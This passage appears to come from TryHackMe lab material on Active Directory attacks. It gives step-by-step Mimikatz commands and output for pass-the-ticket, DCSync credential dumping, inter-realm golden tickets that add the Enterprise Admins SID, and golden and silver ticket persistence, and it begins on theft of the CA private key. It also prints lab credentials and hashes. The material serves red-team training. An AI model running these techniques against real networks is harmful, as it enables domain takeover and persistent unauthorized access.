         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED
```

Now we can use Mimikatz to load the TGT and authenticate to THMDC:

Powershell

```
C:\Tools>mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt administrator.kirbi

* File: 'administrator.kirbi': OK

mimikatz # exitBye!

C:\Tools>dir \\THMDC.za.tryhackme.loc\c$\
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows Volume Serial Number is 1634-22A9

 Directory of \\THMDC.za.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
04/30/2022  10:24 AM               154 dns_entries.csv
04/27/2022  10:53 PM           885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin
09/15/2018  08:19 AM    <DIR>          PerfLogs
03/21/2020  09:31 PM    <DIR>          Program Files
03/21/2020  09:28 PM    <DIR>          Program Files (x86)
04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1
04/25/2022  07:13 PM    <DIR>          tmp
04/27/2022  08:22 AM    <DIR>          Users
04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  08:12 PM    <DIR>          Windows
               7 File(s)      2,356,811 bytes
               7 Dir(s)  50,914,541,568 bytes free

```

Finally, we have access to Tier 0 infrastructure and have compromised the full child domain!

**Exploiting Domain Trusts**

Even though we have 
access to Tier 0 infrastructure, this is still not enough. We have only 
exploited the ZA.TRYHACKME.LOC domain. Surely TRYHACKME must have 
domains for other regions as well? Well, if we take control of the root 
domain, TRYHACKME.LOC, we will be in a position to compromise all of 
these regional domains. In this task, we will look at how domain trust 
can be exploited to take control of the entire forest.

# Domain Trusts

As discussed in the [AD Basics room](https://tryhackme.com/jr/activedirectorybasics), a forest is a collection of one or more domain trees inside an AD network. Domain Trusts are a mechanism for users 
in the network to gain access to other resources in the domain. For the 
most part, trusts outline how the domains inside of a forest 
communicate with each other. In some environments, trusts can be extended 
out to external domains and even forests in some cases.

There are two main types of trusts that can be configured between domains:

- Directional - The direction of the trust flows from a trusting domain to a trusted domain
- Transitive - The trust relationship expands beyond just two domains to include other trusted domains

It
 is common to have a root or parent domain in a forest. In our case, 
this is TRYHACKME.LOC. For each regional office, sub or child domains 
are created, such as ZA.TRYHACKME.LOC or UK.TRYHACKME.LOC. This forest 
configuration will allow the sharing of resources between the ZA and the
 UK office. For example, if some user in the UK office requires access 
to THMSERVER1, we can grant access for the user in the ZA domain. This 
permission delegation works since there is bidirectional trust between 
ZA and the root domain and the UK and the root domain, essentially 
creating a transitive trust between ZA and UK.

As
 mentioned above, the trust between a parent and child domain is 
bidirectional. This is intended behaviour and is used to share resources
 through greater transitive trust relationships. However, as an 
attacker, we can also exploit this trust to compromise the parent domain
 if we have compromised a child domain.

# KRBTGT and Golden Tickets

KRBTGT is the account used for Microsoft's implementation of Kerberos.
 The name is derived from Kerberos (KRB) and Ticket Granting Ticket 
(TGT). Essentially, this account acts as the service account for the 
Kerberos Distribution Center (KDC) service, which handles all Kerberos 
ticket requests. This account is used to encrypt and sign all Kerberos 
tickets for the domain. Since the password hash is shared by all domain 
controllers, they can then verify the authenticity of the received TGT 
when users request access to resources.

However, what if we
 want to generate our own TGTs to grant us access to everything? This is
 known as a Golden Ticket attack. In a Golden Ticket attack, we bypass 
the KDC altogether and create our own TGTs, essentially becoming a 
Ticket Granting Server (TGS). In order to forge TGTs, we need the 
following information:

- The FQDN of the domain
- The Security Identifier (SID) of the domain
- The username of the account we want to impersonate
- The KRBTGT password hash

The
 first three are usually easy to recover. The last one requires a domain
 compromise since the KRBTGT password hash is only stored on domain 
controllers. Luckily for us, we have just compromised the Tier 0 admins 
group with a forged certificate, so we are in a position to recover the 
KRBTGT password hash.

We will again use Mimikatz with a DC Sync to recover the KRBTGT password hash on THMSERVER2:

Command Prompt

```
C:\Tools>mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /user:za\krbtgt
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be theDC server
[DC] 'za\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 4/25/2022 7:18:22 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: removed
    ntlm- 0: removed
    lm  - 0: removed
[....]
```

# Inter-Realm TGTs

Using
 the KRBTGT password hash, we could now forge a Golden Ticket to access 
any resource in the child domain. This will also be discussed in more 
detail in the Persisting AD
 room. However, we can take this a step further by forging an 
Inter-Realm TGT. Inter-Realm TGTs are used to provide access to 
resources in other domains. In our case, we want to exploit the 
bidirectional trust relationship between the child and parent domain to 
gain full access to the parent domain.

We will 
include extra account SIDs from other domains when we construct the 
Golden Ticket to perform this exploit. Mimikatz can assist with this, 
allowing us to set the ExtraSids section of the KERB_VALIDATION_INFO 
structure of the Kerberos
 TGT. The ExtraSids section is described as “A pointer to a list of 
KERB_SID_AND_ATTRIBUTES structures that contain a list of SIDs 
corresponding to groups in domains other than the account domain to 
which the principal belongs”.

The key here is that we will 
exploit the trust the parent domain has with our child domain by adding 
the SID of the Enterprise Admins (EA) group as an extra SID to our 
forged ticket for the domain controller of the child domain. The EA 
group belongs to the parent domain and membership to this group 
essentially grants Administrative privileges over the entire forest! The
 default SID for this group is S-1-5-21-<RootDomain>-519.

Before we can go into exploitation, we first need to recover two SIDs:

- The SID of the child domain controller (THMDC), which we will impersonate in our forged TGT
- The SID of the Enterprise Admins in the parent domain, which we will add as an extra SID to our forged TGT

To
 recover these SIDs, we can use the AD-RSAT Powershell cmdlets. We can 
recover the SID of the child domain controller using the following 
command:

Command Prompt

```
PS C:\> Get-ADComputer -Identity "THMDC"

DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DNSHostName       : THMDC.za.tryhackme.loc
Enabled           : True
Name              : THMDC
ObjectClass       : computer
ObjectGUID        : bd651750-782b-4b09-93b4-b5987ec7311b
SamAccountName    : THMDC$
SID               : S-1-5-21-3885271727-2693558621-2658995185-1001
UserPrincipalName :
```

We can recover the SID of the Enterprise Admins group using the following command to query the parent domain controller:

Command Prompt

```
PS C:\> Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc

DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : a23ae384-16e8-44d5-9b36-8173c4e0e5de
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-3330634377-removed-519
```

# Exploiting Domain Trusts

We finally have all of the information required to create our forged TGT. We will use Mimikatz to generate this golden ticket. The command will look something like this:

Command Prompt

```
C:\Tools>mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
User      : Administrator
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185-1001
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3330634377-1326264276-632209373-519 ;
ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
Service   : krbtgt
Lifetime  : 4/30/2022 7:52:51 PM ; 4/27/2032 7:52:51 PM ; 4/27/2032 7:52:51 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ za.tryhackme.loc' successfully submitted for current session
```

First,
 we will verify that this ticket works for access to THMDC since it is a
 valid ticket for the Administrator user of the child domain:

Command Prompt

```
C:\>dir \\thmdc.za.tryhackme.loc\c$
 Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows Volume Serial Number is 1634-22A9

 Directory of \\thmdc.za.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
04/30/2022  10:24 AM               154 dns_entries.csv
09/15/2018  08:19 AM    <DIR>          PerfLogs
03/21/2020  09:31 PM    <DIR>          Program Files
03/21/2020  09:28 PM    <DIR>          Program Files (x86)
04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1
04/25/2022  07:13 PM    <DIR>          tmp
04/27/2022  08:22 AM    <DIR>          Users
04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  08:12 PM    <DIR>          Windows
               7 File(s)      2,356,811 bytes
               7 Dir(s)  50,913,189,888 bytes free;
```

This at least confirms that the Golden Ticket was forged for access to the child DC. However, since we specified extra SIDs, we should also now have access to the parent DC:

Command Prompt

```
C:\>dir \\thmrootdc.tryhackme.loc\c$\
 Volume in drive \\thmrootdc.tryhackme.loc\c$ is Windows Volume Serial Number is 1634-22A9

 Directory of \\thmrootdc.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
09/15/2018  08:19 AM    <DIR>          PerfLogs
03/21/2020  09:31 PM    <DIR>          Program Files
03/21/2020  09:25 PM    <DIR>          Program Files (x86)
04/23/2022  09:21 AM                58 root_dns_entries.csv
04/23/2022  09:22 AM             1,432 thm-network-setup-dc.ps1
04/25/2022  05:50 PM    <DIR>          tmp
04/27/2022  07:54 AM    <DIR>          Users
04/25/2022  05:50 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  06:29 PM    <DIR>          Windows
               3 File(s)          1,593 bytes
               7 Dir(s)  51,105,730,560 bytes free
```

This proves that we now have fully compromised the parent domain solely by compromising one of the child domains!

**PERSISTING ACTIVE DIRECTORY**

**Persistence through Credentials**

# Congratulations

Congratulations weary traveler! After breaching AD,
 performing enumeration, and exploiting it all the way to the top (if 
you have done these AD networks in order), you have finally made it to 
the tavern of persistence. The hard work is over and it is now time for 
some fun. While AD persistence is still serious business, it is really 
not as stressful as the other phases. Here we can let our creativity 
flow free. So rest your weary bones in our tavern, get yourself a nice 
cup of tea and let's begin.

Together with your 
low-privileged credentials, you will be provided with Domain 
Administrator credentials. What luck! When discussing persistence 
techniques, you will use the privileged credentials to perform the 
persistence technique on your low-privileged credential set. Make a note
 of the following DA account:

Username: `Administrator`

Password: `tryhackmewouldnotguess1@`

Domain: `ZA`

Since
 we provide your with full access over the entire domain, we can't 
really hide any flags or force you to make sure you perform these 
persistence techniques yourself before answering the questions. It is 
however encouraged that you take your time to work through these 
methods, as they will pay dividends in return on a red team assessment 
when the blue team starts kicking you out.

The first and
 least reliable persistence technique that we will discuss is 
credentials. Several of the lateral techniques discussed in previous 
rooms would have resulted in the attacker gaining access to credentials.
 When using the word credentials, it can mean a username and password 
pair, but in the context of AD, even the password hash is sufficient for authentication through pass-the-hash techniques.

# DC

It
 is not sufficient to have a single domain controller per domain in 
large organisations. These domains are often used in multiple regional 
locations, and having a single DC
 would significantly delay any authentication services in AD. As such, 
these organisations make use of multiple DCs. The question then becomes,
 how is it possible for you to authenticate using the same credentials 
in two different offices?

The answer to that question
 is domain replication. Each domain controller runs a process called the
 Knowledge Consistency Checker (KCC). The KCC generates a replication 
topology for the AD
 forest and automatically connects to other domain controllers through 
Remote Procedure Calls (RPC) to synchronise information. This includes 
updated information such as the user's new password and new objects such
 as when a new user is created. This is why you usually have to wait a 
couple of minutes before you authenticate after you have changed your 
password since the DC where the password change occurred could perhaps 
not be the same one as the one where you are authenticating to.

The process of replication is called DC
 Synchronisation. It is not just the DCs that can initiate replication. 
Accounts such as those belonging to the Domain Admins groups can also do
 it for legitimate purposes such as creating a new domain controller.

A popular attack to perform is a DC
 Sync attack. If we have access to an account that has domain 
replication permissions, we can stage a DC Sync attack to harvest 
credentials from a DC.

# Not All Credentials Are Created Equal

Before starting our DC
 Sync attack, let's first discuss what credentials we could potentially 
hunt for. While we should always look to dump privileged credentials 
such as those that are members of the Domain Admins group, these are 
also the credentials that will be rotated (a blue team term meaning to 
reset the account's password) first. As such, if we only have privileged
 credentials, it is safe to say as soon as the blue team discovers us, 
they will rotate those accounts, and we can potentially lose our access.

The
 goal then is to persist with near-privileged credentials. We don't 
always need the full keys to the kingdom; we just need enough keys to 
ensure we can still achieve goal execution and always make the blue team
 look over their shoulder. As such, we should attempt to persist through
 credentials such as the following:

- **Credentials that have local administrator rights on several machines.** Usually, organisations have a group or two with local admin rights on
almost all computers. These groups are typically divided into one for
workstations and one for servers. By harvesting the credentials of
members of these groups, we would still have access to most of the
computers in the estate.
- **Service accounts that have delegation permissions.** With these accounts, we would be able to force golden and silver tickets to perform Kerberos delegation attacks.
- **Accounts used for privileged AD services.** If we compromise accounts of privileged services such as Exchange,
Windows Server Update Services (WSUS), or System Center Configuration
Manager (SCCM), we could leverage AD exploitation to once again gain a privileged foothold.

When
 it comes to what credentials to dump and persist through, it is subject
 to many things. You will have to get creative in your thinking and take
 it on a case-by-case basis. However, for this room, we are going to 
have some fun, make the blue team sweat, and dump every single 
credential we can get our hands on!

# DCSync All

We will be using Mimikatz to harvest credentials. SSH into THMWRK1 using the DA account and load Mimikatz:

Terminal

```markup
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\administrator@THMWRK1 C:\Users\Administrator.ZA>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Let's start by performing a DC Sync of a single account, our own:

Mimikatz Terminal

```markup
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilegeAD Username>
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] 'aaron.jones' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : aaron.jones

** SAM ACCOUNT **

SAM Username         : aaron.jones
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   :
Password last change : 4/25/2022 7:30:21 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1429
Object Relative ID   : 1429

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc
    ntlm- 0: fbdcd5041c96ddbd82224270b57f11fc
    lm  - 0: 0fd2685aa18c78bd265d02bdec203b04

[...]

* Primary:WDigest *
    01  991d45386dd3561e0c5529d3605f96e6
    02  d5d6f25b233c87b289706d7b423f1145
[...]
```

You will see quite a bit of output, including the current NTLM hash of your account. You can verify that the NTLM hash is correct by using a [website such as this](https://codebeautify.org/ntlm-hash-generator) to transform your password into an NTLM hash.

This is great and all, but we want to DC sync every single account. To do this, we will have to enable logging on Mimikatz:

Mimikatz Terminal

```markup
mimikatz # log <username>_dcdump.txt
Using '<username>_dcdump.txt' for logfile: OK
```

Make
 sure to change <username> to your username as to not overwrite 
the logdump of other users. Now, instead of specifying our account, we 
will use the /all flag:

Mimikatz Terminal

```markup
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```

This
 will take a bit of time to complete. Once done, exit Mimikatz to 
finalise the dump find and then you can download the 
<username>_dcdump.txt file. You can use `cat <username>_dcdump.txt | grep "SAM Username"` to recover all the usernames and `cat <username>_dcdump.txt | grep "Hash NTLM"`
 for all hashes. We can now either perform an offline password cracking 
attack to recover the plain text credentials or simply perform a pass 
the hash attack with Mimikatz.

**Persistence through Tickets**

As discussed in the 
previous tasks, we often want to persist through service accounts with 
delegation permissions to forge silver and golden tickets. But what are 
those exactly, and why does every blue team tabletop exercise end with 
someone shouting: "Flush all golden and silver tickets!".

# Tickets to the Chocolate Factory

Before getting into golden and silver tickets, we first just need to do a quick recap on Kerberos authentication. The diagram below shows the normal flow for Kerberos authentication:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d8b0bf2303eb0486da1737ac6a07da51.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d8b0bf2303eb0486da1737ac6a07da51.png)

The user makes an AS-REQ to the Key Distribution Centre (KDC)
 on the DC that includes a timestamp encrypted with the user's NTLM 
hash. Essentially, this is the request for a Ticket Granting Ticket 
(TGT). The DC checks the information and sends the TGT to the user. This
 TGT is signed with the KRBTGT account's password hash that is only 
stored on the DC. The user can now send this TGT to the DC to request a 
Ticket Granting Service (TGS) for the resource that the user wants to 
access. If the TGT checks out, the DC responds to the TGS that is 
encrypted with the NTLM hash of the service that the user is requesting 
access for. The user then presents this TGS to the service for access, 
which can verify the TGS since it knows its own hash and can grant the 
user access.

With all of that background theory being said, it is time to look into Golden and Silver tickets.

# Golden Tickets

Golden Tickets are forged TGTs. What this means is we bypass steps 1 and 2 of the diagram above, where we prove to the DC
 who we are. Having a valid TGT of a privileged account, we can now 
request a TGS for almost any service we want. In order to forge a golden
 ticket, we need the KRBTGT account's password hash so that we can sign a
 TGT for any user account we want. Some interesting notes about Golden 
Tickets:

- By injecting at this stage of the Kerberos process, we don't need the password hash of the account we want to
impersonate since we bypass that step. The TGT is only used to prove
that the KDC on a DC signed it. Since it was signed by the KRBTGT hash,
this verification passes and the TGT is declared valid no matter its
contents.
- Speaking of contents, the KDC will only validate the user account specified in the TGT if it is older than 20 minutes. This means we can put a disabled,
deleted, or non-existent account in the TGT, and it will be valid as
long as we ensure the timestamp is not older than 20 minutes.
- Since the policies and rules for tickets are set in the TGT itself, we could overwrite the values pushed by the KDC, such as, for
example, that tickets should only be valid for 10 hours. We could, for
instance, ensure that our TGT is valid for 10 years, granting us
persistence.
- By default, the KRBTGT account's password
never changes, meaning once we have it, unless it is manually rotated,
we have persistent access by generating TGTs forever.
- The blue
team would have to rotate the KRBTGT account's password twice, since the current and previous passwords are kept valid for the account. This is
to ensure that accidental rotation of the password does not impact
services.
- Rotating the KRBTGT account's password is an incredibly painful process for the blue team
since it will cause a significant amount of services in the environment
to stop working. They think they have a valid TGT, sometimes for the
next couple of hours, but that TGT is no longer valid. Not all services
are smart enough to release the TGT is no longer valid (since the
timestamp is still valid) and thus won't auto-request a new TGT.
- Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT.
- We can generate a golden ticket on any machine, even one that is not
domain-joined (such as our own attack machine), making it harder for the blue team to detect.

Apart from the KRBTGT account's 
password hash, we only need the domain name, domain SID, and user ID for
 the person we want to impersonate. If we are in a position where we can
 recover the KRBTGT account's password hash, we would already be in a 
position where we can recover the other pieces of the required 
information.

# Silver Tickets

Silver
 Tickets are forged TGS tickets. So now, we skip all communication (Step
 1-4 in the diagram above) we would have had with the KDC on the DC and just interface with the service we want access to directly. Some interesting notes about Silver Tickets:

- The generated TGS is signed by the machine account of the host we are targeting.
- The main difference between Golden and Silver Tickets is the number of
privileges we acquire. If we have the KRBTGT account's password hash, we can get access to everything. With a Silver Ticket, since we only have
access to the password hash of the machine account of the server we are
attacking, we can only impersonate users on that host itself. The Silver Ticket's scope is limited to whatever service is targeted on the
specific server.
- Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly
dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the
blue team to detect.
- Since permissions are determined
through SIDs, we can again create a non-existing user for our silver
ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host's local administrators group.
- The machine account's password is usually rotated every 30 days, which
would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host's registry and alter the
parameter that is responsible for the password rotation of the machine
account. Thereby ensuring the machine account remains static and
granting us persistence on the machine.
- While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but
also the means to continue enumerating and exploiting AD as you would
with an AD user account.

# Forging Tickets for Fun and Profit

Now that we have explained the basics for Golden and Silver Tickets, let's generate some. You will need the NTLM
 hash of the KRBTGT account, which you should now have due to the DC 
Sync performed in the previous task. Furthermore, make a note of the 
NTLM hash associated with the THMSERVER1 machine account since we will 
need this one for our silver ticket. You can find this information in 
the DC dump that you performed. The last piece of information we need is
 the Domain SID. Using our low-privileged SSH terminal on THMWRK1, we 
can use the AD-RSAT cmdlet to recover this information:

Terminal

```markup
za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator.ZA> Get-ADDomain

AllowedDNSSuffixes                 : {}
ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=loc
DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc
DistinguishedName                  : DC=za,DC=tryhackme,DC=loc
DNSRoot                            : za.tryhackme.loc
DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DomainMode                         : Windows2012R2Domain
DomainSID                          : S-1-5-21-3885271727-2693558621-2658995185
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc
Forest                             : tryhackme.loc
InfrastructureMaster               : THMDC.za.tryhackme.loc
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc}
LostAndFoundContainer              : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc
ManagedBy                          :
Name                               : za
NetBIOSName                        : ZA
ObjectClass                        : domainDNS
ObjectGUID                         : 1fc9e299-da51-4d03-baa0-862c3360c0b2
ParentDomain                       : tryhackme.loc
PDCEmulator                        : THMDC.za.tryhackme.loc
PublicKeyRequiredPasswordRolling   :
QuotasContainer                    : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {THMDC.za.tryhackme.loc}
RIDMaster                          : THMDC.za.tryhackme.loc
SubordinateReferences              : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc}
SystemsContainer                   : CN=System,DC=za,DC=tryhackme,DC=loc
UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=loc
```

Now that we have all the required information, we can relaunch Mimikatz:

Terminal

```markup
za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Once Mimikatz is loaded, perform the following to generate a golden ticket:

Mimikatz Terminal

```markup
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
```

Parameters explained:

- **/admin** - The username we want to impersonate. This does not have to be a valid user.
- **/domain** - The FQDN of the domain we want to generate the ticket for.
- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
- **/sid** -The SID of the domain we want to generate the ticket for.
- **/krbtgt** -The NTLM hash of the KRBTGT account.
- **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
- **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
- **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

We can verify that the golden ticket is working by running the dir command against the domain controller:

Terminal

```markup
za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>dir \\thmdc.za.tryhackme.loc\c$\
```

Even
 if the golden ticket has an incredibly long time, the blue team can 
still defend against this by simply rotating the KRBTGT password twice. 
If we really want to dig in our roots, we want to generate silver 
tickets, which are less likely to be discovered and significantly harder
 to defend against since the passwords of every machine account must be 
rotated. We can use the following Mimikatz command to generate a silver 
ticket:

Mimikatz Terminal

```markup
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```

Parameters explained:

- **/admin** - The username we want to impersonate. This does not have to be a valid user.
- **/domain** - The FQDN of the domain we want to generate the ticket for.
- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
- **/sid** -The SID of the domain we want to generate the ticket for.
- **/target** - The hostname of our target server. Let's do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.
- **/rc4** - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that
it is a machine account.
- **/service** - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
- **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

We can verify that the silver ticket is working by running the dir command against THMSERVER1:

Terminal

```markup
za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>dir \\thmserver1.za.tryhackme.loc\c$\
```

Now we have golden and silver tickets to the AD environment, providing better persistence than just credentials!

**Persistence through Certificates**

**A quick note here. The 
techniques discussed from this 
point forward are incredibly invasive and hard to remove. Even if you 
have signoff on your red team exercise to perform these techniques, you 
must take the utmost caution when performing these techniques. In 
real-world scenarios, the exploitation of most of these techniques would
 result in a full domain 
rebuild. Make sure you fully understand the consequences of using these 
techniques and only perform them if you have prior approval on your 
assessment and they are deemed necessary. In most cases, a red team 
exercise would be dechained at this point instead of using these 
techniques. Meaning you would most likely not perform these persistence 
techniques but rather simulate them.**

The last two 
persistence techniques relied on 
credentials. While we can definitely make the blue team's lives 
complicated, they can ultimately rotate enough credentials to kick us 
out. So 
while these techniques are great to keep the blue team busy while we 
keep them busy, we should look to use persistence techniques that are 
credential agnostic, meaning the rotation of these will not kick us out.
 The first of these we will be looking at is certificates.

# The Return of CS

In the [Exploiting AD](http://tryhackme.com/jr/exploitingad)
 room, we leveraged certificates to become Domain Admins. However, 
certificates can also be used for persistence. All we need is a valid 
certificate that can be used for Client Authentication. This will allow 
us to use the certificate to request a TGT. The beauty of this? We can 
continue requesting TGTs no matter how many rotations they do on the 
account we are attacking. The only way we can be kicked out is if they revoke
 the certificate we generated or if it expires. Meaning we probably have
 persistent access by default for roughly the next 5 years.

If 
you are interested in a refresh about requesting a certificate and using
 it for Kerberos authentication, please go to either the [Exploiting AD](http://tryhackme.com/jr/exploitingad) or [AD Certificates Template](http://tryhackme.com/jr/adcertificatetemplates) room. However, in this room, we are not messing around. We are going after the Certificate Authority (CA) itself.

Depending
 on our access, we can take it another step further. We could simply 
steal the private key of the root CA's certificate to generate 
our own certificates whenever we feel like it. Even worse, since these 
certificates were never issued by the CA, the blue team has no ability 
to revoke them. This would be even worse for the blue team since it 
would mean a rotation of the CA, meaning all issued certificates would 
have to be revoked by the blue team to kick us out. Imagine you've just 
spent the last two days performing a domain takeback by rotating the 
credentials of every single privileges account, resetting all the golden
 and silver tickets, just to realise the attackers persisted by becoming
 your CA. Yikes!

# Extracting the Private Key

The
 private key 
of the CA is stored on the CA server itself. If the private key is not 
